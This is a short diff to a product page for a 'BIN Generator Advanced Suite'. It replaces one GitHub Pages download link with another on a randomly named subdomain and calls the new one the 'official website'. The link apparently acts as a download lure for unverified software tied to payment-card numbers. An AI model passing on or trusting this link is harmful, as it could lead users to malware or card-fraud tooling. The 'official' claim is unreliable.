@@ -38,4 +38,4 @@ A4: BIN Generator Advanced Suite is designed for legitimate purposes such as dat
 
 ## Download
 
-Get started with BIN Generator Advanced Suite today! [Download from official website](https://yellowtaxisave.github.io/download-page/) to access all features and tools.
+Get started with BIN Generator Advanced Suite today! [Download from official website](https://capitals-707-bringing.github.io/download-page/) to access all features and tools.
